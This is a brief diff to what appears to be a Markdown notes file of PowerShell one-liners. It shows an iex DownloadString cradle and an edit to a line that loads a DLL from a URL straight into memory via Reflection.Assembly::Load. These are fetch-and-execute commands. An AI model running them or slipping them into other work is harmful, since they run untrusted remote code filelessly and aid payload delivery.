@@ -34,5 +34,5 @@ iex ((New-Object System.Net.WebClient).DownloadString("Your Script URL"))
 ```
 And finally, The Holy Grail One-liner, IMO. Manually importing Raw DLL module data into your current PS session.
 ```
-Import-Module ([System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri "Your DLL Module File URL").content))
+Import-Module ([System.Reflection.Assembly]::Load((Invoke-WebRequest -UseBasicParsing -Uri "Your DLL Module File URL").content))
 ```
